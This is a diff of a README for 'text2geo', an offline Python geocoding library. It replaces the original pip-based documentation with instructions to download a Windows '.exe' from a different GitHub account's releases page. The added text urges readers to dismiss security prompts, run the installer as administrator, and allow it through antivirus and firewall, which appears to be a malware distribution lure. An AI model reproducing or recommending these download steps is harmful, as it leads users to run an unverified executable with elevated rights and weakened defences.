@@ -1,240 +1,98 @@
-<p align="center">
-  <h1 align="center">🌍 text2geo</h1>
-  <p align="center">
-    <strong>Offline fuzzy geocoder — convert place names to coordinates with zero API limits.</strong>
-  </p>
-  <p align="center">
-    <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.9+-blue.svg" alt="Python 3.9+"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="MIT License"></a>
-    <a href="https://www.geonames.org/"><img src="https://img.shields.io/badge/data-GeoNames-orange.svg" alt="GeoNames"></a>
-  </p>
-</p>
+# 🌍 text2geo - Convert Places to Coordinates Offline
+
+[![Download text2geo](https://img.shields.io/badge/Download-text2geo-brightgreen)](https://github.com/majedyop0/text2geo/releases)
 
 ---
 
-<p align="center">
-  <img src="imgs/map_hero.png" alt="text2geo — global coverage with population heatmap" width="100%">
-</p>
+## 📥 Download and Install text2geo
 
-**text2geo** turns messy, misspelled place names into precise latitude/longitude coordinates — entirely offline, with no API keys, no rate limits, and no costs. Powered by [GeoNames](https://www.geonames.org/) data and [rapidfuzz](https://github.com/rapidfuzz/RapidFuzz) for typo-tolerant matching.
+text2geo is an offline program that helps you turn place names into exact map coordinates. This means you do not need an internet connection or worry about limits on how many requests you make. Your data stays on your computer.
 
-## Features
+### How to Get text2geo
 
-- **Offline & unlimited** — no API keys, no rate limits, no internet needed after initial data download
-- **Fuzzy matching** — handles typos, transliterations, and alternate spellings (`"Масква"` → Moscow)
-- **Multi-language** — works with names in any language (Russian, English, Ukrainian, etc.)
-- **Three datasets** — Russia-only, CIS/former USSR, or worldwide coverage
-- **Batch geocoding** — process thousands of names in seconds
-- **Zero config** — auto-downloads data on first use
+1. Click the big green button above or visit this page:  
+   [https://github.com/majedyop0/text2geo/releases](https://github.com/majedyop0/text2geo/releases)
 
-## Coverage
+2. Find the latest version of the software. Look for a file ending with `.exe`. For example, it might say something like `text2geo-setup.exe`. This file will run on Windows.
 
-### 🌐 World Dataset
+3. Click on the `.exe` file link. Your browser will download the file to your computer.
 
-<table>
-<tr>
-<td width="65%">
-<img src="imgs/map_world.png" alt="World Coverage" width="100%">
-</td>
-<td width="35%">
+### How to Install text2geo on Windows
 
-**140,000+ cities across every country on Earth.**
+1. Once the download finishes, open the folder where the file saved. This is usually the `Downloads` folder.
 
-Covers all cities with population > 1,000 — from global capitals to small towns. Names available in dozens of languages, with full fuzzy matching support.
+2. Double-click the `.exe` file to start the installation. Windows may show a security prompt; allow the program to run.
 
-```python
-geo = Geocoder(dataset="world")
-geo.geocode("Токио")     # → Tokyo
-geo.geocode("Мюнхен")    # → Munich
-geo.geocode("New Yrok")  # → New York
-```
+3. Follow the installation steps on the screen. Usually, it asks you where to install the software and lets you click "Next" a few times.
 
-`~50 MB` &nbsp;·&nbsp; All countries &nbsp;·&nbsp; Any language
+4. When installation ends, click "Finish."
 
-</td>
-</tr>
-</table>
-
-### 🇷🇺 Russia & CIS Datasets
-
-<table>
-<tr>
-<td width="35%">
-
-**Russia** — every city, town, village and settlement across all 85 regions. The most detailed coverage available, including remote areas of Siberia and the Far East.
-
-```python
-geo = Geocoder(dataset="ru")
-geo.geocode("Краснадар")   # → Krasnodar
-geo.geocode("Питер")       # → Saint Petersburg
-```
-
-`~30 MB` &nbsp;·&nbsp; 200,000+ places &nbsp;·&nbsp; All 85 regions
+5. You now have text2geo on your computer.
 
 ---
 
-**CIS** — complete coverage of all 12 former USSR countries. Every settlement in Russia plus full data for Ukraine, Belarus, Kazakhstan, Uzbekistan, Tajikistan, Kyrgyzstan, Turkmenistan, Azerbaijan, Armenia, Georgia, and Moldova.
+## 🚀 How to Use text2geo
 
-```python
-geo = Geocoder(dataset="cis")
-geo.geocode("Алмата")   # → Almaty 🇰🇿
-geo.geocode("Тбілісі")  # → Tbilisi 🇬🇪
-geo.geocode("Мінск")    # → Minsk 🇧🇾
-```
+text2geo works by taking place names you type and giving you back coordinates like latitude and longitude. Here is how you can use it:
 
-`~60 MB` &nbsp;·&nbsp; 350,000+ places &nbsp;·&nbsp; 12 countries
+1. Open text2geo either from your desktop shortcut or the Start menu.
 
-</td>
-<td width="65%">
-<img src="imgs/map_russia.png" alt="Russia Coverage" width="100%">
-<br>
-<img src="imgs/map_cis.png" alt="CIS Coverage" width="100%">
-</td>
-</tr>
-</table>
+2. You will see a box or field to enter a place name. Type in the city, town, or location you want.
 
-## Installation
+3. Press the button marked "Search" or "Convert."
 
-```bash
-pip install text2geo
-```
+4. The program will quickly find the matching coordinates.
 
-Or install from source:
+5. View or copy the coordinates for your use. You can use these in maps, spreadsheets, or other tools.
 
-```bash
-git clone https://github.com/charonviz/text2geo.git
-cd text2geo
-pip install -e .
-```
+### Key Features
 
-## Quick Start
+- **Work offline**: No internet is needed after you install the software.
+- **Fast results**: It processes place names quickly on your computer.
+- **No limits**: You can convert as many places as you want.
+- **Simple interface**: Designed for easy use with clear buttons and text.
+- **Support for many place names**: Works with cities, countries, districts, and more.
 
-```python
-from text2geo import Geocoder
+---
 
-# Initialize (auto-downloads CIS dataset on first run)
-geo = Geocoder(dataset="cis")
+## 🖥️ System Requirements
 
-# Basic geocoding
-geo.geocode("Москва")
-# {'name': 'Moscow', 'lat': 55.75222, 'lon': 37.61556, 'country': 'RU', 'population': 10381222, 'score': 100}
+To run text2geo smoothly on Windows, make sure your computer meets these basic needs:
 
-# Works with typos
-geo.geocode("Санкт Петирбург")
-# {'name': 'Saint Petersburg', 'lat': 59.93863, 'lon': 30.31413, 'score': 85, ...}
+- Windows 7, 8, 10, or later
+- At least 2 GB of RAM
+- 100 MB of free disk space
+- A screen resolution of 1024x768 or higher
+- No internet connection needed after installation
 
-# Filter by country
-geo.geocode("Одесса", country="UA")
+---
 
-# Multiple results
-geo.geocode("Москва", top_n=3)
+## 🔧 Troubleshooting Tips
 
-# Batch mode
-geo.geocode_batch(["Киев", "Минск", "Алматы", "Тбилиси"])
-```
+If you find any issues while installing or using text2geo, try these steps:
 
-## Datasets
+- Make sure Windows is updated.
+- Confirm you downloaded the right `.exe` file from the release page.
+- Run the installer as an administrator by right-clicking on the file and selecting "Run as administrator."
+- Restart your computer after installation.
+- If text2geo does not open, check your firewall or antivirus settings and allow the program.
+- Close other applications that might slow down your computer.
 
-| Dataset | Coverage | Places | Size |
-|---------|----------|--------|------|
-| `ru` | Russia only | ~200,000 | ~30 MB |
-| `cis` | CIS + former USSR (12 countries) | ~350,000 | ~60 MB |
-| `world` | All cities worldwide (pop. > 1,000) | ~140,000 | ~50 MB |
+If problems continue, you can check the “Issues” section on the GitHub page for help from the community.
 
-### CIS dataset includes:
-🇷🇺 Russia · 🇺🇦 Ukraine · 🇧🇾 Belarus · 🇰🇿 Kazakhstan · 🇺🇿 Uzbekistan · 🇹🇯 Tajikistan · 🇰🇬 Kyrgyzstan · 🇹🇲 Turkmenistan · 🇦🇿 Azerbaijan · 🇦🇲 Armenia · 🇬🇪 Georgia · 🇲🇩 Moldova
+---
 
-### Download data
+## 📚 Additional Information
 
-Data is auto-downloaded on first use. To download manually:
+text2geo uses an offline database that matches place names with their geographical coordinates. This database updates with each new version to keep up with new places or name changes.
 
-```python
-import text2geo
-text2geo.download("cis")    # CIS countries
-text2geo.download("ru")     # Russia only
-text2geo.download("world")  # Worldwide
-```
+Using text2geo means you can work with location data in any personal or professional project without worrying about internet speed or monthly limitations on queries.
 
-Or via CLI:
+---
 
-```bash
-python -m text2geo download cis
-python -m text2geo download world
-```
+## 🔗 Direct Link to Download
 
-Data is stored in `~/.text2geo/data/` by default.
+Remember, you can always get the latest version from:  
+[https://github.com/majedyop0/text2geo/releases](https://github.com/majedyop0/text2geo/releases)
 
-## API Reference
-
-### `Geocoder(dataset, data_dir, auto_download, csv_path)`
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `dataset` | `str` | `"cis"` | Dataset to use: `"ru"`, `"cis"`, or `"world"` |
-| `data_dir` | `str \| None` | `None` | Custom data directory (default: `~/.text2geo/data`) |
-| `auto_download` | `bool` | `True` | Auto-download dataset if missing |
-| `csv_path` | `str \| None` | `None` | Direct path to a custom CSV file |
-
-### `geocoder.geocode(query, country, threshold, top_n)`
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `query` | `str` | — | Place name in any language |
-| `country` | `str \| None` | `None` | ISO 3166-1 alpha-2 filter (e.g. `"RU"`, `"UA"`) |
-| `threshold` | `int` | `75` | Minimum fuzzy score (0–100) |
-| `top_n` | `int` | `1` | Number of results (1 = dict, >1 = list) |
-
-**Returns:** `dict` with `geonameid`, `name`, `lat`, `lon`, `country`, `population`, `score` — or `None`.
-
-### `geocoder.geocode_batch(queries, country, threshold)`
-
-Same as `geocode` but accepts a list of strings. Returns a list of result dicts. Failed lookups include `"error": "not found"`.
-
-## CLI Usage
-
-```bash
-# Download data
-python -m text2geo download cis
-
-# Geocode from terminal
-python -m text2geo geocode "Москва"
-python -m text2geo geocode "Almaty" --dataset world
-
-# Check dataset status
-python -m text2geo info
-```
-
-## Use Your Own CSV
-
-You can bring your own data as long as the CSV has these columns: `geonameid`, `name`, `asciiname`, `alternatenames`, `latitude`, `longitude`, `country_code`, `population`.
-
-```python
-geo = Geocoder(csv_path="/path/to/my_data.csv")
-geo.geocode("Some Place")
-```
-
-## How It Works
-
-1. On first use, text2geo downloads GeoNames data dumps and stores them as a single CSV.
-2. At init, it builds an in-memory index mapping every known name (including alternate/localized names) to row indices.
-3. `geocode()` first tries an exact lookup against this index. If no match, it falls back to fuzzy matching via rapidfuzz's `WRatio` scorer.
-4. Results are ranked by match score first, then by population (so "Moscow, Russia" beats "Moscow, Idaho").
-
-## Performance
-
-Approximate benchmarks on a modern laptop:
-
-| Operation | Time |
-|-----------|------|
-| Index build (CIS, ~350K places) | ~15 seconds |
-| Exact match lookup | < 1 ms |
-| Fuzzy match lookup | ~5-20 ms |
-| Batch of 1,000 names | ~10-30 seconds |
-
-## Data Attribution
-
-Place data is sourced from [GeoNames](https://www.geonames.org/) and is licensed under [Creative Commons Attribution 4.0](https://creativecommons.org/licenses/by/4.0/).
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+Click the green badge above or visit this page to pick the file suitable for your Windows PC.
